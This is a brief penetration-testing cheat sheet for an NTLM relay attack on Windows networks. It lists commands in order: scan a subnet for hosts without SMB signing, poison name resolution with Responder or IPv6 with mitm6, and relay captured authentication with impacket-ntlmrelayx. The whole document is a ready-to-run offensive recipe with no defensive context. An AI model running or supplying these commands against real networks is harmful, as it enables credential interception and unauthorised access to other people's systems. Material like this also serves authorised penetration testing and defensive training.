# NTLM Relay
```powershell
// Check SMB Signing
crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt

// Run Responder
responder -I eth0 -dwv
OR
// IPv6 Poisining
mitm6 -i eth0 -d oxsium.local

impacket-ntlmrelayx -tf targets.txt -smb2support
```
